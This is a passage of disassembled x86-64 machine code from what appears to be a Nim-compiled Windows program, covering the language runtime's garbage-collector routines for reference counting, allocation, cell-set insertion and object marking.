  402ea9:	e8 f2 ed ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  402eae:	48 89 da             	mov    %rbx,%rdx
  402eb1:	48 8d 48 50          	lea    0x50(%rax),%rcx
  402eb5:	48 83 c4 20          	add    $0x20,%rsp
  402eb9:	5b                   	pop    %rbx
  402eba:	eb c1                	jmp    402e7d <addZCT__Y66tOYFjgwJ0k4aLz4bc0Q>
  402ebc:	48 83 c4 20          	add    $0x20,%rsp
  402ec0:	5b                   	pop    %rbx
  402ec1:	c3                   	ret

0000000000402ec2 <unsureAsgnRef>:
  402ec2:	56                   	push   %rsi
  402ec3:	53                   	push   %rbx
  402ec4:	48 83 ec 28          	sub    $0x28,%rsp
  402ec8:	48 89 ce             	mov    %rcx,%rsi
  402ecb:	48 89 d3             	mov    %rdx,%rbx
  402ece:	e8 2e ee ff ff       	call   401d01 <isOnStack__plOlFsQAAvcYd3nF5LfWzw>
  402ed3:	84 c0                	test   %al,%al
  402ed5:	75 1f                	jne    402ef6 <unsureAsgnRef+0x34>
  402ed7:	48 85 db             	test   %rbx,%rbx
  402eda:	74 05                	je     402ee1 <unsureAsgnRef+0x1f>
  402edc:	48 83 43 f0 08       	addq   $0x8,-0x10(%rbx)
  402ee1:	48 8b 0e             	mov    (%rsi),%rcx
  402ee4:	48 81 f9 ff 0f 00 00 	cmp    $0xfff,%rcx
  402eeb:	76 09                	jbe    402ef6 <unsureAsgnRef+0x34>
  402eed:	48 83 e9 10          	sub    $0x10,%rcx
  402ef1:	e8 9b ff ff ff       	call   402e91 <decRef__AT1eRuflKWyTTBdLjEDZbgsystem.lto_priv.82>
  402ef6:	48 89 1e             	mov    %rbx,(%rsi)
  402ef9:	48 83 c4 28          	add    $0x28,%rsp
  402efd:	5b                   	pop    %rbx
  402efe:	5e                   	pop    %rsi
  402eff:	c3                   	ret

0000000000402f00 <asgnRef.lto_priv.64>:
  402f00:	56                   	push   %rsi
  402f01:	53                   	push   %rbx
  402f02:	48 83 ec 28          	sub    $0x28,%rsp
  402f06:	48 85 d2             	test   %rdx,%rdx
  402f09:	48 89 ce             	mov    %rcx,%rsi
  402f0c:	48 89 d3             	mov    %rdx,%rbx
  402f0f:	74 05                	je     402f16 <asgnRef.lto_priv.64+0x16>
  402f11:	48 83 42 f0 08       	addq   $0x8,-0x10(%rdx)
  402f16:	48 8b 0e             	mov    (%rsi),%rcx
  402f19:	48 85 c9             	test   %rcx,%rcx
  402f1c:	74 09                	je     402f27 <asgnRef.lto_priv.64+0x27>
  402f1e:	48 83 e9 10          	sub    $0x10,%rcx
  402f22:	e8 6a ff ff ff       	call   402e91 <decRef__AT1eRuflKWyTTBdLjEDZbgsystem.lto_priv.82>
  402f27:	48 89 1e             	mov    %rbx,(%rsi)
  402f2a:	48 83 c4 28          	add    $0x28,%rsp
  402f2e:	5b                   	pop    %rbx
  402f2f:	5e                   	pop    %rsi
  402f30:	c3                   	ret

0000000000402f31 <nimGCunrefNoCycle.lto_priv.79>:
  402f31:	48 83 e9 10          	sub    $0x10,%rcx
  402f35:	e9 57 ff ff ff       	jmp    402e91 <decRef__AT1eRuflKWyTTBdLjEDZbgsystem.lto_priv.82>

0000000000402f3a <alloc0__UxtcZ3QOXKsB7mMchxUf9cg>:
  402f3a:	53                   	push   %rbx
  402f3b:	48 83 ec 30          	sub    $0x30,%rsp
  402f3f:	48 89 d3             	mov    %rdx,%rbx
  402f42:	e8 df fb ff ff       	call   402b26 <alloc__UxtcZ3QOXKsB7mMchxUf9cg_2>
  402f47:	48 89 da             	mov    %rbx,%rdx
  402f4a:	48 89 c1             	mov    %rax,%rcx
  402f4d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  402f52:	e8 6b ea ff ff       	call   4019c2 <nimZeroMem.lto_priv.58>
  402f57:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
  402f5c:	48 83 c4 30          	add    $0x30,%rsp
  402f60:	5b                   	pop    %rbx
  402f61:	c3                   	ret

0000000000402f62 <alloc0Impl__WrVG9abV9chlTLqkiXYLKwUg>:
  402f62:	53                   	push   %rbx
  402f63:	48 83 ec 20          	sub    $0x20,%rsp
  402f67:	48 89 cb             	mov    %rcx,%rbx
  402f6a:	e8 31 ed ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  402f6f:	48 89 da             	mov    %rbx,%rdx
  402f72:	48 8d 88 a0 00 00 00 	lea    0xa0(%rax),%rcx
  402f79:	48 83 c4 20          	add    $0x20,%rsp
  402f7d:	5b                   	pop    %rbx
  402f7e:	eb ba                	jmp    402f3a <alloc0__UxtcZ3QOXKsB7mMchxUf9cg>

0000000000402f80 <incl__azHo9bY5qs9b2EZ9cSse4fmZA>:
  402f80:	41 54                	push   %r12
  402f82:	55                   	push   %rbp
  402f83:	57                   	push   %rdi
  402f84:	56                   	push   %rsi
  402f85:	53                   	push   %rbx
  402f86:	48 83 ec 20          	sub    $0x20,%rsp
  402f8a:	48 8b 69 08          	mov    0x8(%rcx),%rbp
  402f8e:	48 89 cb             	mov    %rcx,%rbx
  402f91:	48 8b 49 18          	mov    0x18(%rcx),%rcx
  402f95:	48 89 d7             	mov    %rdx,%rdi
  402f98:	48 89 d6             	mov    %rdx,%rsi
  402f9b:	48 c1 ef 0c          	shr    $0xc,%rdi
  402f9f:	48 89 ea             	mov    %rbp,%rdx
  402fa2:	48 21 fa             	and    %rdi,%rdx
  402fa5:	48 8b 04 d1          	mov    (%rcx,%rdx,8),%rax
  402fa9:	48 85 c0             	test   %rax,%rax
  402fac:	74 16                	je     402fc4 <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0x44>
  402fae:	48 3b 78 08          	cmp    0x8(%rax),%rdi
  402fb2:	0f 84 d9 00 00 00    	je     403091 <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0x111>
  402fb8:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
  402fbc:	48 ff c2             	inc    %rdx
  402fbf:	48 21 ea             	and    %rbp,%rdx
  402fc2:	eb e1                	jmp    402fa5 <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0x25>
  402fc4:	48 8b 13             	mov    (%rbx),%rdx
  402fc7:	48 8d 4d 01          	lea    0x1(%rbp),%rcx
  402fcb:	48 8d 04 09          	lea    (%rcx,%rcx,1),%rax
  402fcf:	4c 8d 04 52          	lea    (%rdx,%rdx,2),%r8
  402fd3:	4c 39 c0             	cmp    %r8,%rax
  402fd6:	7c 0c                	jl     402fe4 <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0x64>
  402fd8:	49 89 cb             	mov    %rcx,%r11
  402fdb:	49 29 d3             	sub    %rdx,%r11
  402fde:	49 83 fb 03          	cmp    $0x3,%r11
  402fe2:	7f 5e                	jg     403042 <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0xc2>
  402fe4:	48 ff c8             	dec    %rax
  402fe7:	48 c1 e1 04          	shl    $0x4,%rcx
  402feb:	48 89 43 08          	mov    %rax,0x8(%rbx)
  402fef:	e8 6e ff ff ff       	call   402f62 <alloc0Impl__WrVG9abV9chlTLqkiXYLKwUg>
  402ff4:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
  402ff8:	45 31 c0             	xor    %r8d,%r8d
  402ffb:	49 89 c4             	mov    %rax,%r12
  402ffe:	4c 39 c5             	cmp    %r8,%rbp
  403001:	7d 0b                	jge    40300e <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0x8e>
  403003:	e8 9e f5 ff ff       	call   4025a6 <deallocImpl__lmwgHsdhTsrQaepFju8wew>
  403008:	4c 89 63 18          	mov    %r12,0x18(%rbx)
  40300c:	eb 34                	jmp    403042 <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0xc2>
  40300e:	4e 8b 0c c1          	mov    (%rcx,%r8,8),%r9
  403012:	4d 85 c9             	test   %r9,%r9
  403015:	74 26                	je     40303d <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0xbd>
  403017:	48 8b 43 08          	mov    0x8(%rbx),%rax
  40301b:	49 8b 51 08          	mov    0x8(%r9),%rdx
  40301f:	48 21 c2             	and    %rax,%rdx
  403022:	4d 8d 14 d4          	lea    (%r12,%rdx,8),%r10
  403026:	49 83 3a 00          	cmpq   $0x0,(%r10)
  40302a:	75 05                	jne    403031 <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0xb1>
  40302c:	4d 89 0a             	mov    %r9,(%r10)
  40302f:	eb 0c                	jmp    40303d <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0xbd>
  403031:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
  403035:	48 ff c2             	inc    %rdx
  403038:	48 21 c2             	and    %rax,%rdx
  40303b:	eb e5                	jmp    403022 <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0xa2>
  40303d:	49 ff c0             	inc    %r8
  403040:	eb bc                	jmp    402ffe <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0x7e>
  403042:	48 8b 53 08          	mov    0x8(%rbx),%rdx
  403046:	48 89 f8             	mov    %rdi,%rax
  403049:	48 ff 03             	incq   (%rbx)
  40304c:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
  403050:	48 21 d0             	and    %rdx,%rax
  403053:	48 83 3c c1 00       	cmpq   $0x0,(%rcx,%rax,8)
  403058:	48 8d 2c c5 00 00 00 	lea    0x0(,%rax,8),%rbp
  40305f:	00 
  403060:	75 23                	jne    403085 <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0x105>
  403062:	b9 50 00 00 00       	mov    $0x50,%ecx
  403067:	e8 f6 fe ff ff       	call   402f62 <alloc0Impl__WrVG9abV9chlTLqkiXYLKwUg>
  40306c:	48 8b 53 10          	mov    0x10(%rbx),%rdx
  403070:	48 89 78 08          	mov    %rdi,0x8(%rax)
  403074:	48 89 10             	mov    %rdx,(%rax)
  403077:	48 8b 53 18          	mov    0x18(%rbx),%rdx
  40307b:	48 89 43 10          	mov    %rax,0x10(%rbx)
  40307f:	48 89 04 2a          	mov    %rax,(%rdx,%rbp,1)
  403083:	eb 0c                	jmp    403091 <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0x111>
  403085:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  403089:	48 ff c0             	inc    %rax
  40308c:	48 21 d0             	and    %rdx,%rax
  40308f:	eb c2                	jmp    403053 <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0xd3>
  403091:	48 c1 ee 03          	shr    $0x3,%rsi
  403095:	ba 01 00 00 00       	mov    $0x1,%edx
  40309a:	48 89 f1             	mov    %rsi,%rcx
  40309d:	81 e1 ff 01 00 00    	and    $0x1ff,%ecx
  4030a3:	49 89 c8             	mov    %rcx,%r8
  4030a6:	48 d3 e2             	shl    %cl,%rdx
  4030a9:	49 c1 e8 06          	shr    $0x6,%r8
  4030ad:	4a 09 54 c0 10       	or     %rdx,0x10(%rax,%r8,8)
  4030b2:	48 83 c4 20          	add    $0x20,%rsp
  4030b6:	5b                   	pop    %rbx
  4030b7:	5e                   	pop    %rsi
  4030b8:	5f                   	pop    %rdi
  4030b9:	5d                   	pop    %rbp
  4030ba:	41 5c                	pop    %r12
  4030bc:	c3                   	ret

00000000004030bd <markS__SOJE9bROCOc8iabVsKM64Sg>:
  4030bd:	55                   	push   %rbp
  4030be:	57                   	push   %rdi
  4030bf:	56                   	push   %rsi
  4030c0:	53                   	push   %rbx
  4030c1:	48 83 ec 28          	sub    $0x28,%rsp
  4030c5:	bd 01 00 00 00       	mov    $0x1,%ebp
  4030ca:	48 8d b9 90 33 00 00 	lea    0x3390(%rcx),%rdi
  4030d1:	48 89 d3             	mov    %rdx,%rbx
  4030d4:	48 89 ce             	mov    %rcx,%rsi
  4030d7:	48 89 f9             	mov    %rdi,%rcx
  4030da:	e8 a1 fe ff ff       	call   402f80 <incl__azHo9bY5qs9b2EZ9cSse4fmZA>
  4030df:	ba 01 00 00 00       	mov    $0x1,%edx
  4030e4:	48 89 d9             	mov    %rbx,%rcx
  4030e7:	e8 ed 05 00 00       	call   4036d9 <forAllChildren__XCvXrotwhq0gugZtuZTNPQ>
  4030ec:	48 8b 46 48          	mov    0x48(%rsi),%rax
  4030f0:	48 85 c0             	test   %rax,%rax
  4030f3:	7e 6d                	jle    403162 <markS__SOJE9bROCOc8iabVsKM64Sg+0xa5>
  4030f5:	48 8b 56 58          	mov    0x58(%rsi),%rdx
  4030f9:	48 ff c8             	dec    %rax
  4030fc:	48 89 f9             	mov    %rdi,%rcx
  4030ff:	48 89 46 48          	mov    %rax,0x48(%rsi)
  403103:	48 8b 1c c2          	mov    (%rdx,%rax,8),%rbx
  403107:	48 89 da             	mov    %rbx,%rdx
  40310a:	48 c1 ea 0c          	shr    $0xc,%rdx
  40310e:	e8 1f e5 ff ff       	call   401632 <cellSetGet__ld9aj9akVqWcvwRCEMEk1MnQ>
  403113:	48 85 c0             	test   %rax,%rax
  403116:	75 0d                	jne    403125 <markS__SOJE9bROCOc8iabVsKM64Sg+0x68>
  403118:	48 89 da             	mov    %rbx,%rdx
  40311b:	48 89 f9             	mov    %rdi,%rcx
  40311e:	e8 5d fe ff ff       	call   402f80 <incl__azHo9bY5qs9b2EZ9cSse4fmZA>
  403123:	eb 2e                	jmp    403153 <markS__SOJE9bROCOc8iabVsKM64Sg+0x96>
  403125:	48 89 d9             	mov    %rbx,%rcx
  403128:	49 89 e9             	mov    %rbp,%r9
  40312b:	48 c1 e9 03          	shr    $0x3,%rcx
  40312f:	81 e1 ff 01 00 00    	and    $0x1ff,%ecx
  403135:	48 89 ca             	mov    %rcx,%rdx
  403138:	49 d3 e1             	shl    %cl,%r9
  40313b:	48 c1 ea 06          	shr    $0x6,%rdx
  40313f:	48 83 c2 02          	add    $0x2,%rdx
  403143:	4c 8b 04 d0          	mov    (%rax,%rdx,8),%r8
  403147:	4d 85 c8             	test   %r9,%r8
  40314a:	75 a0                	jne    4030ec <markS__SOJE9bROCOc8iabVsKM64Sg+0x2f>
  40314c:	4d 09 c8             	or     %r9,%r8
  40314f:	4c 89 04 d0          	mov    %r8,(%rax,%rdx,8)
  403153:	ba 01 00 00 00       	mov    $0x1,%edx
  403158:	48 89 d9             	mov    %rbx,%rcx
  40315b:	e8 79 05 00 00       	call   4036d9 <forAllChildren__XCvXrotwhq0gugZtuZTNPQ>
  403160:	eb 8a                	jmp    4030ec <markS__SOJE9bROCOc8iabVsKM64Sg+0x2f>
  403162:	48 83 c4 28          	add    $0x28,%rsp
  403166:	5b                   	pop    %rbx
  403167:	5e                   	pop    %rsi
  403168:	5f                   	pop    %rdi
  403169:	5d                   	pop    %rbp
  40316a:	c3                   	ret

000000000040316b <doOperation__sl6eqhLncFedgwzv6TlMVw>:
  40316b:	56                   	push   %rsi
  40316c:	53                   	push   %rbx
  40316d:	48 83 ec 28          	sub    $0x28,%rsp
  403171:	48 89 cb             	mov    %rcx,%rbx
  403174:	89 d6                	mov    %edx,%esi
  403176:	e8 25 eb ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  40317b:	48 85 db             	test   %rbx,%rbx
  40317e:	74 4c                	je     4031cc <doOperation__sl6eqhLncFedgwzv6TlMVw+0x61>
  403180:	48 8d 53 f0          	lea    -0x10(%rbx),%rdx
  403184:	40 80 fe 01          	cmp    $0x1,%sil
  403188:	74 30                	je     4031ba <doOperation__sl6eqhLncFedgwzv6TlMVw+0x4f>
  40318a:	40 84 f6             	test   %sil,%sil
  40318d:	74 1c                	je     4031ab <doOperation__sl6eqhLncFedgwzv6TlMVw+0x40>
  40318f:	40 80 fe 02          	cmp    $0x2,%sil
  403193:	74 08                	je     40319d <doOperation__sl6eqhLncFedgwzv6TlMVw+0x32>
  403195:	40 80 fe 03          	cmp    $0x3,%sil
  403199:	74 1f                	je     4031ba <doOperation__sl6eqhLncFedgwzv6TlMVw+0x4f>
  40319b:	eb 2f                	jmp    4031cc <doOperation__sl6eqhLncFedgwzv6TlMVw+0x61>
  40319d:	48 89 d1             	mov    %rdx,%rcx
  4031a0:	48 83 c4 28          	add    $0x28,%rsp
  4031a4:	5b                   	pop    %rbx
  4031a5:	5e                   	pop    %rsi
  4031a6:	e9 e6 fc ff ff       	jmp    402e91 <decRef__AT1eRuflKWyTTBdLjEDZbgsystem.lto_priv.82>
  4031ab:	48 8d 48 38          	lea    0x38(%rax),%rcx
  4031af:	48 83 c4 28          	add    $0x28,%rsp
  4031b3:	5b                   	pop    %rbx
  4031b4:	5e                   	pop    %rsi
  4031b5:	e9 03 ff ff ff       	jmp    4030bd <markS__SOJE9bROCOc8iabVsKM64Sg>
  4031ba:	48 8d 88 80 00 00 00 	lea    0x80(%rax),%rcx
  4031c1:	48 83 c4 28          	add    $0x28,%rsp
  4031c5:	5b                   	pop    %rbx
  4031c6:	5e                   	pop    %rsi
  4031c7:	e9 78 f9 ff ff       	jmp    402b44 <add__W9aRfhn7HvnQTPAb8ajo1uwsystem>
  4031cc:	48 83 c4 28          	add    $0x28,%rsp
  4031d0:	5b                   	pop    %rbx
  4031d1:	5e                   	pop    %rsi
  4031d2:	c3                   	ret

00000000004031d3 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_3>:
  4031d3:	48 83 ec 28          	sub    $0x28,%rsp
  4031d7:	e8 c4 ea ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  4031dc:	31 d2                	xor    %edx,%edx
  4031de:	48 8b 48 08          	mov    0x8(%rax),%rcx
  4031e2:	48 83 c4 28          	add    $0x28,%rsp
  4031e6:	eb 83                	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

00000000004031e8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_6>:
  4031e8:	48 83 ec 28          	sub    $0x28,%rsp
  4031ec:	e8 af ea ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  4031f1:	31 d2                	xor    %edx,%edx
  4031f3:	48 8b 48 28          	mov    0x28(%rax),%rcx
  4031f7:	48 83 c4 28          	add    $0x28,%rsp
  4031fb:	e9 6b ff ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

0000000000403200 <Marker_tySequence__WF89a8QyKeDCh4DYWTmSiBg>:
  403200:	57                   	push   %rdi
  403201:	56                   	push   %rsi
  403202:	53                   	push   %rbx
  403203:	48 83 ec 20          	sub    $0x20,%rsp
  403207:	31 db                	xor    %ebx,%ebx
  403209:	48 89 ce             	mov    %rcx,%rsi
  40320c:	0f b6 fa             	movzbl %dl,%edi
  40320f:	48 85 f6             	test   %rsi,%rsi
  403212:	74 1d                	je     403231 <Marker_tySequence__WF89a8QyKeDCh4DYWTmSiBg+0x31>
  403214:	48 3b 1e             	cmp    (%rsi),%rbx
  403217:	7d 18                	jge    403231 <Marker_tySequence__WF89a8QyKeDCh4DYWTmSiBg+0x31>
  403219:	48 89 d8             	mov    %rbx,%rax
  40321c:	89 fa                	mov    %edi,%edx
  40321e:	48 ff c3             	inc    %rbx
  403221:	48 c1 e0 04          	shl    $0x4,%rax
  403225:	48 8b 4c 06 18       	mov    0x18(%rsi,%rax,1),%rcx
  40322a:	e8 3c ff ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  40322f:	eb de                	jmp    40320f <Marker_tySequence__WF89a8QyKeDCh4DYWTmSiBg+0xf>
  403231:	48 83 c4 20          	add    $0x20,%rsp
  403235:	5b                   	pop    %rbx
  403236:	5e                   	pop    %rsi
  403237:	5f                   	pop    %rdi
  403238:	c3                   	ret

0000000000403239 <Marker_tyRef__vU9aO9cTqOMn6CBzhV8rX7Sw>:
  403239:	56                   	push   %rsi
  40323a:	53                   	push   %rbx
  40323b:	48 83 ec 28          	sub    $0x28,%rsp
  40323f:	48 89 ce             	mov    %rcx,%rsi
  403242:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  403246:	0f b6 da             	movzbl %dl,%ebx
  403249:	89 da                	mov    %ebx,%edx
  40324b:	e8 1b ff ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  403250:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
  403254:	89 da                	mov    %ebx,%edx
  403256:	e8 10 ff ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  40325b:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
  40325f:	89 da                	mov    %ebx,%edx
  403261:	e8 05 ff ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  403266:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
  40326a:	89 da                	mov    %ebx,%edx
  40326c:	48 83 c4 28          	add    $0x28,%rsp
  403270:	5b                   	pop    %rbx
  403271:	5e                   	pop    %rsi
  403272:	e9 f4 fe ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

0000000000403277 <Marker_tyRef__9clYsYwyjCqe2PFTuCI3Ubg>:
  403277:	56                   	push   %rsi
  403278:	53                   	push   %rbx
  403279:	48 83 ec 28          	sub    $0x28,%rsp
  40327d:	48 89 ce             	mov    %rcx,%rsi
  403280:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  403284:	0f b6 da             	movzbl %dl,%ebx
  403287:	89 da                	mov    %ebx,%edx
  403289:	e8 dd fe ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  40328e:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
  403292:	89 da                	mov    %ebx,%edx
  403294:	e8 d2 fe ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  403299:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
  40329d:	89 da                	mov    %ebx,%edx
  40329f:	e8 c7 fe ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  4032a4:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
  4032a8:	89 da                	mov    %ebx,%edx
  4032aa:	48 83 c4 28          	add    $0x28,%rsp
  4032ae:	5b                   	pop    %rbx
  4032af:	5e                   	pop    %rsi
  4032b0:	e9 b6 fe ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

00000000004032b5 <Marker_tyRef__8SzoIAgLw9ci2v0yafHj9b6Q>:
  4032b5:	56                   	push   %rsi
  4032b6:	53                   	push   %rbx
  4032b7:	48 83 ec 28          	sub    $0x28,%rsp
  4032bb:	48 89 ce             	mov    %rcx,%rsi
  4032be:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  4032c2:	0f b6 da             	movzbl %dl,%ebx
  4032c5:	89 da                	mov    %ebx,%edx
  4032c7:	e8 9f fe ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  4032cc:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
  4032d0:	89 da                	mov    %ebx,%edx
  4032d2:	e8 94 fe ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  4032d7:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
  4032db:	89 da                	mov    %ebx,%edx
  4032dd:	e8 89 fe ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  4032e2:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
  4032e6:	89 da                	mov    %ebx,%edx
  4032e8:	48 83 c4 28          	add    $0x28,%rsp
  4032ec:	5b                   	pop    %rbx
  4032ed:	5e                   	pop    %rsi
  4032ee:	e9 78 fe ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

00000000004032f3 <Marker_tyRef__Pjt0MQjoA6TAHAHOFNel9cg>:
  4032f3:	eb c0                	jmp    4032b5 <Marker_tyRef__8SzoIAgLw9ci2v0yafHj9b6Q>

00000000004032f5 <Marker_tyRef__HMIVdYjdZYWskTmTQVo5BQ>:
  4032f5:	56                   	push   %rsi
  4032f6:	53                   	push   %rbx
  4032f7:	48 83 ec 28          	sub    $0x28,%rsp
  4032fb:	48 89 ce             	mov    %rcx,%rsi
  4032fe:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  403302:	0f b6 da             	movzbl %dl,%ebx
  403305:	89 da                	mov    %ebx,%edx
  403307:	e8 5f fe ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  40330c:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
  403310:	89 da                	mov    %ebx,%edx
  403312:	e8 54 fe ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  403317:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
  40331b:	89 da                	mov    %ebx,%edx
  40331d:	e8 49 fe ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  403322:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
  403326:	89 da                	mov    %ebx,%edx
  403328:	48 83 c4 28          	add    $0x28,%rsp
  40332c:	5b                   	pop    %rbx
  40332d:	5e                   	pop    %rsi
  40332e:	e9 38 fe ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

0000000000403333 <Marker_tyRef__DsOOBcxCUeVlNUDRmn9afcA>:
  403333:	eb c0                	jmp    4032f5 <Marker_tyRef__HMIVdYjdZYWskTmTQVo5BQ>

0000000000403335 <Marker_tyRef__M8bPR1OE5OXPYGyQdVHfTg>:
  403335:	eb be                	jmp    4032f5 <Marker_tyRef__HMIVdYjdZYWskTmTQVo5BQ>

0000000000403337 <Marker_tyRef__A79aQ4kopJRWUJmF9aQu6afA>:
  403337:	eb bc                	jmp    4032f5 <Marker_tyRef__HMIVdYjdZYWskTmTQVo5BQ>

0000000000403339 <Marker_tyRef__Ie1m0dv1ZHg72IgPRr1cDw>:
  403339:	eb ba                	jmp    4032f5 <Marker_tyRef__HMIVdYjdZYWskTmTQVo5BQ>

000000000040333b <TM__LJ9cWUOIKdJkv7vFbyFx9a6g_3>:
  40333b:	48 8b 0d f6 1c 02 00 	mov    0x21cf6(%rip),%rcx        # 425038 <channel__N5eXcSZk9cFx3Xyn4EpWNYw+0x8>
  403342:	31 d2                	xor    %edx,%edx
  403344:	e9 22 fe ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

0000000000403349 <TM__LJ9cWUOIKdJkv7vFbyFx9a6g_2>:
  403349:	48 8b 0d 08 1d 02 00 	mov    0x21d08(%rip),%rcx        # 425058 <base64Ss__oiZt3HUh4E3gRrnK1to7IQ>
  403350:	31 d2                	xor    %edx,%edx
  403352:	e9 14 fe ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

0000000000403357 <TM__gfe9a52b5gJr8GSrnr883iA_5>:
  403357:	48 83 ec 28          	sub    $0x28,%rsp
  40335b:	e8 40 e9 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  403360:	31 d2                	xor    %edx,%edx
  403362:	48 8b 88 80 34 00 00 	mov    0x3480(%rax),%rcx
  403369:	48 83 c4 28          	add    $0x28,%rsp
  40336d:	e9 f9 fd ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

0000000000403372 <Marker_tyRef__OGnyBMU9csFmaJm9bh2uOQiQ>:
  403372:	56                   	push   %rsi
  403373:	53                   	push   %rbx
  403374:	48 83 ec 28          	sub    $0x28,%rsp
  403378:	48 89 ce             	mov    %rcx,%rsi
  40337b:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  40337f:	0f b6 da             	movzbl %dl,%ebx
  403382:	89 da                	mov    %ebx,%edx
  403384:	e8 e2 fd ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  403389:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
  40338d:	89 da                	mov    %ebx,%edx
  40338f:	e8 d7 fd ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  403394:	48 8b 4e 40          	mov    0x40(%rsi),%rcx
  403398:	89 da                	mov    %ebx,%edx
  40339a:	48 83 c4 28          	add    $0x28,%rsp
  40339e:	5b                   	pop    %rbx
  40339f:	5e                   	pop    %rsi
  4033a0:	e9 c6 fd ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

00000000004033a5 <Marker_tyRef__TjokxNjmnZmr9bygVDVC9bvg>:
  4033a5:	56                   	push   %rsi
  4033a6:	53                   	push   %rbx
  4033a7:	48 83 ec 28          	sub    $0x28,%rsp
  4033ab:	48 89 ce             	mov    %rcx,%rsi
  4033ae:	48 8b 49 10          	mov    0x10(%rcx),%rcx
  4033b2:	0f b6 da             	movzbl %dl,%ebx
  4033b5:	89 da                	mov    %ebx,%edx
  4033b7:	e8 af fd ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  4033bc:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
  4033c0:	89 da                	mov    %ebx,%edx
  4033c2:	e8 a4 fd ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  4033c7:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
  4033cb:	89 da                	mov    %ebx,%edx
  4033cd:	e8 99 fd ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  4033d2:	48 8b 4e 30          	mov    0x30(%rsi),%rcx
  4033d6:	89 da                	mov    %ebx,%edx
  4033d8:	48 83 c4 28          	add    $0x28,%rsp
  4033dc:	5b                   	pop    %rbx
  4033dd:	5e                   	pop    %rsi
  4033de:	e9 88 fd ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

00000000004033e3 <Marker_tyRef__gcUT3qWwCET3KjsqW7m5vQ>:
  4033e3:	56                   	push   %rsi
  4033e4:	53                   	push   %rbx
  4033e5:	48 83 ec 28          	sub    $0x28,%rsp
  4033e9:	48 89 ce             	mov    %rcx,%rsi
